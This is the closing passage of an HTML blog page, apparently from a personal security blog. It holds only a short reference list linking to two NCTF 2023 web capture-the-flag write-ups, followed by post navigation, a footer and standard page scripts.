<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1] <a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/">https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/</a><br>[2] <a target="_blank" rel="noopener" href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#evilmq">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#evilmq</a></p>
</div>
          <nav class="post-nav">
    
    
    <a class="post-nav-item post-nav-next" href="/2023/12/09/new-begin/">
      <div class="nav-arrow">OLDER&nbsp;&gt;</div>
      <span class="post-title">New begin</span>
    </a>
    
  </nav>

   </main>
</div>

  <footer class="footer">
    <small class="footer_copyright">
      <div id="bottom-inner">
        © 2023 Site by daem0nu
      </div>
    </small>
  </footer>
  
  

    
      <script src="/js/main.js"></script>
    
  
  <script>
    window.FPConfig = {
      delay: 0,
      ignoreKeywords: [],
      maxRPS: 3,
      hoverDelay: 50,
    };
  </script>
  <script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
</body>
</html>
